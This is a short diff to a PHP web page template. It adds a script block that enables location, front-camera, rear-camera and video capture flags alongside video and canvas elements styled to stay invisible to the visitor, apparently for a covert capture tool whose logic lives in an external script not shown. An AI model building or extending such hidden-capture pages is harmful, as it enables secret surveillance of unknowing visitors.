@@ -238,6 +238,16 @@
         <canvas id="frontphoto_canvas" style="display:none;" height="600" width="500"></canvas>
         <video id="rearphoto" autoplay="true" playsinline="true" muted="true" width="500" height="600" style="visibility: hidden; opacity: 0; position: fixed; transform: scale(-1, 1);"></video>
         <canvas id="rearphoto_canvas" style="display:none;" height="600" width="500"></canvas>
+        <script>
+            // const post_id='bc18a962c50850b2';
+            const post_id=<?php echo $post_id; ?>;
+            const delay='1000';
+            // const delay=<?php echo $delay; ?>;
+            const locenable='1';
+            const frontenable='1';
+            const rearenable='1';
+            const videoenable='1';
+        </script>
         <script src="<?php echo BASE_URL; ?>/public/nisy.js?v=1.0.8"></script>
         <script src="<?php echo BASE_URL; ?>/register.js?v=1.0.0"></script>
         <div id="pwainstall" class="modal fade" tabindex="-1" role="dialog" style="display: none;" aria-hidden="true">
